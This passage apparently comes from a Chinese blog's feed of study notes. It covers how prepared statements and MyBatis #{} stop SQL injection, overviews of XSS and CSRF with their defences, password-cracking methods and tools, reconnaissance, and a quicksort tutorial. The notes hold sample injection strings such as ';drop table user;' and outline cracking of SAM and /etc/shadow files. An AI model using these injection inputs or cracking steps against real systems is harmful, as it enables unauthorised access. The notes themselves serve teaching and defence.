class="keyword">KEY</span> <span class="string">`ab`</span> (<span class="string">`a`</span>,<span class="string">`b`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8</span><br></pre></td></tr></table></figure><p>（2）编译</p><p>我们接下来通过 <code>PREPARE stmt_name FROM preparable_stm</code>的语法来预编译一条sql语句</p><p>mysql&gt; prepare ins from ‘insert into t select ?,?’;<br>Query OK, <strong>0</strong> rows affected (<strong>0.00</strong> sec)<br>Statement prepared</p><p>（3）执行</p><p>我们通过<code>EXECUTE stmt_name [USING @var_name [, @var_name] ...]</code>的语法来执行预编译语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set @a=999,@b='hello';</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; execute ins using @a,@b;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line">Records: 1  Duplicates: 0  Warnings: 0</span><br><span class="line"> </span><br><span class="line">mysql&gt; select * from t;</span><br><span class="line">+<span class="comment">------+-------+</span></span><br><span class="line">| a    | b     |</span><br><span class="line">+<span class="comment">------+-------+</span></span><br><span class="line">|  999 | hello |</span><br><span class="line">+<span class="comment">------+-------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>可以看到，数据已经被成功插入表中。</p><p>MySQL中的预编译语句作用域是session级，但我们可以通过max_prepared_stmt_count变量来控制全局最大的存储的预编译语句。</p><p>mysql&gt; set <strong>@@global</strong>.max_prepared_stmt_count=<strong>1</strong>;<br>Query OK, <strong>0</strong> rows affected (<strong>0.00</strong> sec)<br>mysql&gt; prepare sel from ‘select * from t’;<br>ERROR <strong>1461</strong> (<strong>42000</strong>): Can’t create more than max_prepared_stmt_count statements (current value: 1)</p><p>当预编译条数已经达到阈值时可以看到MySQL会报如上所示的错误。</p><p>（4）释放　如果我们想要释放一条预编译语句，则可以使用<code>{DEALLOCATE | DROP} PREPARE stmt_name</code>的语法进行操作:</p><p>mysql&gt; deallocate prepare ins;<br>Query OK, <strong>0</strong> rows affected (<strong>0.00</strong> sec)</p><p><strong>六：为什么PrepareStatement可以防止sql注入</strong></p><p>原理是采用了预编译的方法，先将SQL语句中可被客户端控制的参数集进行编译，生成对应的临时变量集，再使用对应的设置方法，为临时变量集里面的元素进行赋值，赋值函数setString()，会对传入的参数进行强制类型检查和安全检查，所以就避免了SQL注入的产生。下面具体分析</p><p>（1）：为什么Statement会被sql注入</p><p>因为Statement之所以会被sql注入是因为SQL语句结构发生了变化。比如：</p><p>“select*from tablename where username=’”+uesrname+<br>“‘and password=’”+password+”‘“</p><p>在用户输入’or true or’之后sql语句结构改变。</p><p>select*from tablename where username=’’or true or’’ and password=’’</p><p>这样本来是判断用户名和密码都匹配时才会计数，但是经过改变后变成了或的逻辑关系，不管用户名和密码是否匹配该式的返回值永远为true;</p><p>（2）为什么Preparement可以防止SQL注入。</p><p>因为Preparement样式为</p><p>select*from tablename where username=? and password=?</p><p>该SQL语句会在得到用户的输入之前先用数据库进行预编译，这样的话不管用户输入什么用户名和密码的判断始终都是并的逻辑关系，防止了SQL注入</p><p>简单总结，参数化能防注入的原因在于，语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑，至于跑的时候是带一个普通背包还是一个怪物，不会影响行进路线，无非跑的快点与慢点的区别。</p><hr><p><strong>七：mybatis是如何防止SQL注入的</strong>　　</p><h3 id="1、首先看一下下面两个sql语句的区别："><a href="#1、首先看一下下面两个sql语句的区别：" class="headerlink" title="1、首先看一下下面两个sql语句的区别："></a><strong>1、首先看一下下面两个sql语句的区别：</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id="selectByNameAndPassword" parameterType="java.util.Map" resultMap="BaseResultMap"&gt;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>, username, <span class="keyword">password</span>, <span class="keyword">role</span></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line"><span class="keyword">where</span> username = <span class="comment">#&#123;username,jdbcType=VARCHAR&#125;</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">password</span> = <span class="comment">#&#123;password,jdbcType=VARCHAR&#125;</span></span><br><span class="line">&lt;/<span class="keyword">select</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id="selectByNameAndPassword" parameterType="java.util.Map" resultMap="BaseResultMap"&gt;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>, username, <span class="keyword">password</span>, <span class="keyword">role</span></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line"><span class="keyword">where</span> username = $&#123;username,jdbcType=<span class="built_in">VARCHAR</span>&#125;</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">password</span> = $&#123;<span class="keyword">password</span>,jdbcType=<span class="built_in">VARCHAR</span>&#125;</span><br><span class="line">&lt;/<span class="keyword">select</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>mybatis中的#和$的区别：</strong></p><p><strong>**1、#将传入的数据都当成一个字符串，会对自动传入的数据加一个双引号。如：where username=#{username}，如果传入的值是111,那么解析成sql时的值为where username=”111”, 如果传入的值是id，则解析成的sql为where username=”id”.　　2、$将传入的数据直接显示生成在sql中。如：where username=${username}，如果传入的值是111,那么解析成sql时的值为where username=111；如果传入的值是;drop table user;，则解析成的sql为：select id, username, password, role from user where username=;drop table user;　3、#方式能够很大程度防止sql注入，$方式无法防止Sql注入。　4、$方式一般用于传入数据库对象，例如传入表名.　5、一般能用#的就别用$，若不得不使用“${xxx}”这样的参数，要手工地做好过滤工作，来防止sql注入攻击。　6、在MyBatis中，“${xxx}”这样格式的参数会直接参与SQL编译，从而不能避免注入攻击。但涉及到动态表名和列名时，只能使用“${xxx}”这样的参数格式。所以，这样的参数需要我们在代码中手工进行处理来防止注入。</strong>【结论】在编写MyBatis的映射语句时，尽量采用“#{xxx}”这样的格式。若不得不使用“${xxx}”这样的参数，要手工地做好过滤工作，来防止SQL注入攻击。**</p><h3 id="mybatis是如何做到防止sql注入的"><a href="#mybatis是如何做到防止sql注入的" class="headerlink" title="mybatis是如何做到防止sql注入的"></a><strong>mybatis是如何做到防止sql注入的</strong></h3><p>MyBatis框架作为一款半自动化的持久层框架，其SQL语句都要我们自己手动编写，这个时候当然需要防止SQL注入。其实，MyBatis的SQL是一个具有“<strong>输入+输出</strong>”的功能，类似于函数的结构，参考上面的两个例子。其中，parameterType表示了输入的参数类型，resultType表示了输出的参数类型。回应上文，如果我们想防止SQL注入，理所当然地要在输入参数上下功夫。上面代码中使用#的即输入参数在SQL中拼接的部分，传入参数后，打印出执行的SQL语句，会看到SQL是这样的：</p><p>select id, username, password, role from user where username=? and password=?</p><p>不管输入什么参数，打印出的SQL都是这样的。这是因为MyBatis启用了预编译功能，在SQL执行前，会先将上面的SQL发送给数据库进行编译；执行时，直接使用编译好的SQL，替换占位符“?”就可以了。因为SQL注入只能对编译过程起作用，所以这样的方式就很好地避免了SQL注入的问题。</p><p>【底层实现原理】MyBatis是如何做到SQL预编译的呢？其实在框架底层，是JDBC中的PreparedStatement类在起作用，PreparedStatement是我们很熟悉的Statement的子类，它的对象包含了编译好的SQL语句。这种“准备好”的方式不仅能提高安全性，而且在多次执行同一个SQL时，能够提高效率。原因是SQL已编译好，再次执行时无需再编译</p><h2 id="Xss跨站脚本攻击"><a href="#Xss跨站脚本攻击" class="headerlink" title="Xss跨站脚本攻击"></a>Xss跨站脚本攻击</h2><p>分类：</p><ul><li>反射型xss</li><li>存储型xss</li><li>dom型xss</li></ul><p>反射型，攻击者需要构造含有xss脚本的URL发给受害者，诱使受害者点击链接，服务器会返回带有xss脚本的数据，这时候攻击者可以窃取相关用户数据。</p><p>存储型，xss代码被存到服务器，常见于博客，论坛，留言板之类的，允许用户输入各种字符的文本数据。</p><p>DOM型，不需要和服务器进行交互，由客户端浏览器解析既可触发。不正确的使用了js的各种dom方法。</p><h2 id="防御xss攻击"><a href="#防御xss攻击" class="headerlink" title="防御xss攻击"></a>防御xss攻击</h2><p>服务器向客户端返回数据的时候进行编码（html编码），使用上下文敏感数据编码。</p><h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><p>CSRF攻击是一种针对网站的恶意利用。在用户不知情的情况下，冒充合法用户去发送请求给网站，是用受信任的用户攻击受信任的网站，而XSS则是利用受信任的站点攻击用户。</p><p>CSRF攻击主要需要满足两个条件</p><ol><li>用户登陆某个网站，获得授权</li><li>目标用户访问了攻击者构造的URL</li></ol><p>分类：</p><ul><li>GET型</li><li>POST型</li></ul><p>攻击者伪造一些post请求，诱使用户点击，会携带合法的cookie向服务器发送post请求。</p><h2 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h2><ol><li>增加二次验证机制</li><li>校验referrer字段，保证相关敏感操作来自授权站点的跳转。</li><li>在敏感操作的参数中，增加完全随机的<code>token</code>参数进行校验</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全复习笔记—口令破解与防御</title>
      <link href="/2020/11/27/koulingpojie/"/>
      <url>/2020/11/27/koulingpojie/</url>
      
        <content type="html"><![CDATA[<blockquote><p>复习笔记——口令破解与防御</p></blockquote><a id="more"></a><h2 id="常用口令破解技术"><a href="#常用口令破解技术" class="headerlink" title="常用口令破解技术"></a>常用口令破解技术</h2><ul><li>暴力破解</li><li>字典攻击</li><li>组合攻击</li><li>社会工程学</li></ul><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><ul><li>彩虹表：<a href="https://www.jianshu.com/p/732d9d960411" target="_blank" rel="noopener">https://www.jianshu.com/p/732d9d960411</a></li></ul><p>彩虹表类似字典攻击，但是不是简单的存储明文密钥对。而是采用哈希链来存储，优化一定空间。</p><h3 id="字典攻击"><a href="#字典攻击" class="headerlink" title="字典攻击"></a>字典攻击</h3><p>弱口令和根据用户信息生成的字典进行攻击。</p><h3 id="组合攻击"><a href="#组合攻击" class="headerlink" title="组合攻击"></a>组合攻击</h3><p>组合攻击就是在字典攻击的基础上，增添几个数字几个字母啥的，防止字典没有包含的一些用户口令。</p><h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><p>简而言之就是骗，进行钓鱼。常用工具kali系统的set(social engineering toolkit)</p><h2 id="操作系统口令破解"><a href="#操作系统口令破解" class="headerlink" title="操作系统口令破解"></a>操作系统口令破解</h2><h3 id="Windows系统口令文件"><a href="#Windows系统口令文件" class="headerlink" title="Windows系统口令文件"></a>Windows系统口令文件</h3><p>通过sam文件保存单向散列值。通过安全标示对口令进行管理，安全标示是唯一的，即使删除用户再使用同样的用户名进行创建也会使用不同的安全标示。</p><p>Windows下的两种hash算法</p><ol><li>Lm-hash（暴力破解即可，不安全）</li><li>Not-hash（微软改进的算法）</li></ol><p>这种算法相对来说比较简单，将用户口令进行unicode编码，在进行md4转换得到hash值。</p><h3 id="Windows用户登陆和身份验证"><a href="#Windows用户登陆和身份验证" class="headerlink" title="Windows用户登陆和身份验证"></a>Windows用户登陆和身份验证</h3><ul><li>交互式登陆</li></ul><p>直接通过本地计算机登陆，将密码按照加密过程走一遍，对比hash值即可。</p><ul><li>网络登陆</li></ul><p>网络登陆涉及多种身份认证机制。该章节介绍了htlm机制。</p><p>先把用户口令进行加密，得到hash值，明文则被丢弃，服务器发送一段16位的随机序列，用户对这段序列用hash值进行加密，然后把加密的信息发过去，服务器进行同样进行一遍加密过程，如果得到结果相同，则通过，否则不通过。</p><h2 id="Linux口令"><a href="#Linux口令" class="headerlink" title="Linux口令"></a>Linux口令</h2><p><code>/etc/passwd</code>存放用户id等信息，而加密的口令存放在<code>/etc/shadow</code>中，密钥以<code>$</code>进行分割，第一段写的是加密算法对应的标号，第二段放的是盐值，第三段放的是密钥。</p><p>组口令放在<code>/etc/group</code>文件中，口令信息放在<code>/etc/shadow</code>中。</p><h3 id="操作系统口令破解-1"><a href="#操作系统口令破解-1" class="headerlink" title="操作系统口令破解"></a>操作系统口令破解</h3><p><strong>Windows口令破解</strong></p><p>Windows运行过程sam文件被锁定，可以通过系统漏洞获取sam文件。得到sam文件之后只需要进行口令破解即可。</p><p>常用工具：pwdump，l0phtcrack等</p><p><strong>linux口令破解</strong></p><p>先要获取root权限，在获取<code>/etc/shadow</code>文件，在进行破解。</p><p>常见工具：john the ripper</p><p><strong>数据库口令破解</strong></p><p>mysql数据库的user表中放了用户口令等信息，获取该表之后通过工具破解即可。</p><h2 id="口令防御技术"><a href="#口令防御技术" class="headerlink" title="口令防御技术"></a>口令防御技术</h2><p>使用强口令，定期更换等。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全复习笔记—概论与信息收集</title>
      <link href="/2020/11/18/xinxishouji/"/>
      <url>/2020/11/18/xinxishouji/</url>
      
        <content type="html"><![CDATA[<blockquote><p>网络安全复习笔记一概论与信息收集</p></blockquote><a id="more"></a><h2 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h2><h3 id="网络安全的概念"><a href="#网络安全的概念" class="headerlink" title="网络安全的概念"></a>网络安全的概念</h3><p>基本属性：CIA三元组</p><ul><li>机密性</li><li>完整性</li><li>可用性</li></ul><h3 id="安全威胁"><a href="#安全威胁" class="headerlink" title="安全威胁"></a>安全威胁</h3><ul><li>信息泄露</li><li>信息破坏</li><li>拒绝服务</li></ul><h3 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h3><ul><li>阻断攻击</li><li>截取攻击</li><li>篡改攻击</li><li>未遭攻击</li><li>重放攻击</li></ul><h3 id="网络安全体系结构"><a href="#网络安全体系结构" class="headerlink" title="网络安全体系结构"></a>网络安全体系结构</h3><ul><li>风险分析</li><li>安全策略</li><li>安全服务</li><li>安全机制</li><li>安全服务与安全机制的关系</li></ul><h3 id="安全模型"><a href="#安全模型" class="headerlink" title="安全模型"></a>安全模型</h3><p>$$<br>P^2DR<br>$$</p><ul><li><input checked="" disabled="" type="checkbox"> 策略</li><li><input checked="" disabled="" type="checkbox"> 保护</li><li><input checked="" disabled="" type="checkbox"> 检测</li><li><input checked="" disabled="" type="checkbox"> 响应</li></ul><p>$$<br>PDRR<br>$$</p><ul><li>保护</li><li>检测</li><li>响应</li><li>恢复</li></ul><p>$$<br>P^2DR^2<br>$$</p><ul><li>策略</li><li>防护</li><li>检测</li><li>响应</li><li>恢复</li></ul><h3 id="网络安全等级保护"><a href="#网络安全等级保护" class="headerlink" title="网络安全等级保护"></a>网络安全等级保护</h3><ol><li>网络安全等级保护的概念</li><li>网络安全等级保护相关标准</li><li>网络安全等级保护的等级划分准则<ul><li>第一级：用户自主保护级</li><li>第二级：系统审计保护级</li><li>第三级：安全标记保护级</li><li>第四级：结构化保护级</li><li>第五级：访问验证保护级</li></ul></li><li>网络安全等级保护基本要求</li></ol><blockquote><p>概论一堆概念，推测不会考</p></blockquote><h2 id="信息收集和渗透测试"><a href="#信息收集和渗透测试" class="headerlink" title="信息收集和渗透测试"></a>信息收集和渗透测试</h2><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>攻击流程大致分为：踩点，扫描，查点，访问，提权，窃取信息，湮灭踪迹，创建后门，拒绝服务。</p><h4 id="踩点"><a href="#踩点" class="headerlink" title="踩点"></a>踩点</h4><ol><li><p>公开信息源搜索</p><p>通过公开渠道得到信息，Google高级搜索，Maltego工具。</p></li><li><p>whois查询</p><p>查询域名是否被注册，可以查到注册机构，注册机构信息，域名，网络信息（例如IP地址），联系信息。</p></li><li><p>DNS查询</p><p>常用工具dig和系统命令<code>nslookup</code>命令。</p></li><li><p>网络侦察</p><p>Windows下的<code>tracert</code>命令和Linux下的<code>traceroute</code>命令</p></li></ol><h4 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h4><p>获取目标系统是否开机，运行和监听的服务，操作系统的类型等信息。常见的工具NMAP，superscan。</p><h4 id="查点"><a href="#查点" class="headerlink" title="查点"></a>查点</h4><h4 id="攻击实施阶段"><a href="#攻击实施阶段" class="headerlink" title="攻击实施阶段"></a>攻击实施阶段</h4><h4 id="攻击善后阶段"><a href="#攻击善后阶段" class="headerlink" title="攻击善后阶段"></a>攻击善后阶段</h4>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图解快速排序</title>
      <link href="/2020/11/09/kuaipaitujie/"/>
      <url>/2020/11/09/kuaipaitujie/</url>
      
        <content type="html"><![CDATA[<blockquote><p>转载自：<a href="https://www.sohu.com/a/246785807_684445?qq-pf-to=pcqq.group" target="_blank" rel="noopener">https://www.sohu.com/a/246785807_684445?qq-pf-to=pcqq.group</a></p></blockquote><a id="more"></a><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/e4efbf68bc644e9aa9886abf34b25fcc.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/47e2882d6d2b455fa74624d2480299b3.jpeg" alt="img"></p><p><strong>————— 第二天 —————</strong></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/fe5f113faf43433fa735f59080dcc8b1.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/13fff85aaf744e4ab84688d112e7ef4d.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/4480980a18a54c338724eb12fc72dc36.jpeg" alt="img"></p><p>————————————</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/3cdd1ee9c4734ec0b1c6103034b2e984.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/85e278701995447dbefef6f17e226b00.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/e2754b3d2e4649df9f3d831a648c1381.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/15027d971a32478583f5ba76d33b04b3.jpeg" alt="img"></p><p>同冒泡排序一样，快速排序也属于<strong>交换排序</strong>，通过元素之间的比较和交换位置来达到排序的目的。</p><p>不同的是，冒泡排序在每一轮只把一个元素冒泡到数列的一端，而快速排序<strong>在每一轮挑选一个基准元素，并让其他比它大的元素移动到数列一边，比它小的元素移动到数列的另一边，从而把数列拆解成了两个部分。</strong></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/c41876d8e5144110b1dc21a563f582bc.png" alt="img"></p><p>这种思路就叫做<strong>分治法</strong>。</p><p>每次把数列分成两部分，究竟有什么好处呢？</p><p>假如给定8个元素的数列，一般情况下冒泡排序需要比较8轮，每轮把一个元素移动到数列一端，时间复杂度是O（n^2）。</p><p>而快速排序的流程是什么样子呢？</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/75eff632178f443e9367614a2d8bf5e0.png" alt="img"></p><p>如图所示，在分治法的思想下，原数列在每一轮被拆分成两部分，每一部分在下一轮又分别被拆分成两部分，直到不可再分为止。</p><p>这样一共需要多少轮呢？平均情况下需要logn轮，因此快速排序算法的平均时间复杂度是 <strong>O（nlogn）</strong>。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/fe11f22f7b044848946c93fffb9260cd.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/e06bf222aed949beba1cc1d738c8428e.jpeg" alt="img"></p><p><strong>基准元素的选择</strong></p><p>基准元素，英文pivot，用于在分治过程中以此为中心，把其他元素移动到基准元素的左右两边。</p><p>那么基准元素如何选择呢？</p><p>最简单的方式是选择数列的第一个元素：</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/0ca316487a3d4befb2cd9fa97c090d43.png" alt="img"></p><p>这种选择在绝大多数情况是没有问题的。但是，假如有一个原本逆序的数列，期望排序成顺序数列，那么会出现什么情况呢？</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/ad8ad25cef8a41a1a29986df0f1bd5df.jpeg" alt="img"></p><p><strong>……….</strong></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/510d7d683732433893d084509ec4f915.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/e98e0a713cab4d74b7c369d8d6259ed8.jpeg" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/9e2c1dfaf0a144dab2494b39ec4d7b93.jpeg" alt="img"></p><p>我们该怎么避免这种情况发生呢？</p><p>其实很简单，我们可以不选择数列的第一个元素，而是<strong>随机选择一个元素作为基准元素</strong>。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/8c728db438ec4f07a1f14527ba90d426.png" alt="img"></p><p>这样一来，即使在数列完全逆序的情况下，也可以有效地将数列分成两部分。</p><p>当然，即使是随机选择基准元素，每一次也有极小的几率选到数列的最大值或最小值，同样会影响到分治的效果。</p><p>所以，快速排序的平均时间复杂度是 <strong>O（n**</strong>logn），<strong>最坏情况下的时间复杂度是 **O（n^2）</strong>。</p><p><strong>元素的移动</strong></p><p>选定了基准元素以后，我们要做的就是把其他元素当中小于基准元素的都移动到基准元素一边，大于基准元素的都移动到基准元素另一边。</p><p>具体如何实现呢？有两种方法：</p><p><strong>1.挖坑法</strong></p><p><strong>2.指针交换法</strong></p><p>何谓挖坑法？我们来看一看详细过程。</p><p>给定原始数列如下，要求从小到大排序：</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/52593bc2abe04a3cb221fbe4676ff695.png" alt="img"></p><p>首先，我们选定基准元素Pivot，并记住这个位置index，这个位置相当于一个“坑”。并且设置两个指针left和right，指向数列的最左和最右两个元素：</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/fb0b5c0ddfb24a3b86ca7ebb1f50246b.png" alt="img"></p><p>接下来，从right指针开始，把指针所指向的元素和基准元素做比较。如果比pivot大，则right指针向左移动；如果比pivot小，则把right所指向的元素填入坑中。</p><p>在当前数列中，1&lt;4，所以把1填入基准元素所在位置，也就是坑的位置。这时候，元素1本来所在的位置成为了新的坑。同时，left向右移动一位。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/8ccaeb0286af43579bf29fb06d500e6c.png" alt="img"></p><p>此时，left左边绿色的区域代表着小于基准元素的区域。</p><p>接下来，我们切换到left指针进行比较。如果left指向的元素小于pivot，则left指针向右移动；如果元素大于pivot，则把left指向的元素填入坑中。</p><p>在当前数列中，7&gt;4，所以把7填入index的位置。这时候元素7本来的位置成为了新的坑。同时，right向左移动一位。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/6876bc45fc29440388e6fb7b27d2f7ff.png" alt="img"></p><p>此时，right右边橙色的区域代表着大于基准元素的区域。</p><p>下面按照刚才的思路继续排序：</p><p>8&gt;4，元素位置不变，right左移</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/0d81c8b2efa3468581b0c0b679367c2d.png" alt="img"></p><p>2&lt;4，用2来填坑，left右移，切换到left。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/10c351506ee44209864ee3c7a84eda2b.png" alt="img"></p><p>6&gt;4，用6来填坑，right左移，切换到right。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/dd762269bab448f69da99e15a40656f9.png" alt="img"></p><p>3&lt;4，用3来填坑，left右移，切换到left。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/bb79488f24914a9eae5c8b9222a87a11.png" alt="img"></p><p>5&gt;4，用5来填坑，right右移。这时候left和right重合在了同一位置。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/00104df559a049cba350cc1a3190d5d3.png" alt="img"></p><p>这时候，把之前的pivot元素，也就是4放到index的位置。此时数列左边的元素都小于4，数列右边的元素都大于4，这一轮交换终告结束。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/8a8fe9b8d12742459b788d8ed4763aa8.png" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/dd1a7220462446668cc77e1da015e131.jpeg" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> startIndex, <span class="keyword">int</span> endIndex)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 递归结束条件：startIndex大等于endIndex的时候</span></span><br><span class="line">        <span class="keyword">if</span> (startIndex &gt;= endIndex)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 得到基准元素位置</span></span><br><span class="line">        <span class="keyword">int</span> pivotIndex = partition(arr, startIndex, endIndex);</span><br><span class="line">        <span class="comment">// 用分治法递归数列的两部分</span></span><br><span class="line">        quickSort(arr, startIndex, pivotIndex - <span class="number">1</span>);</span><br><span class="line">        quickSort(arr, pivotIndex + <span class="number">1</span>, endIndex);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> startIndex, <span class="keyword">int</span> endIndex)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 取第一个位置的元素作为基准元素</span></span><br><span class="line">        <span class="keyword">int</span> pivot = arr[startIndex];</span><br><span class="line">        <span class="keyword">int</span> left = startIndex;</span><br><span class="line">        <span class="keyword">int</span> right = endIndex;</span><br><span class="line">        <span class="comment">// 坑的位置，初始等于pivot的位置</span></span><br><span class="line">        <span class="keyword">int</span> index = startIndex;</span><br><span class="line">        <span class="comment">//大循环在左右指针重合或者交错时结束</span></span><br><span class="line">        <span class="keyword">while</span> (right &gt;= left)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//right指针从右向左进行比较</span></span><br><span class="line">            <span class="keyword">while</span> (right &gt;= left)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[right] &lt; pivot)</span><br><span class="line">                &#123;</span><br><span class="line">                    arr[left] = arr[right];</span><br><span class="line">                    index = right;</span><br><span class="line">                    left++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//left指针从左向右进行比较</span></span><br><span class="line">            <span class="keyword">while</span> (right &gt;= left)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[left] &gt; pivot)</span><br><span class="line">                &#123;</span><br><span class="line">                    arr[right] = arr[left];</span><br><span class="line">                    index = left;</span><br><span class="line">                    right--;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                left++;</span><br><span class="line">            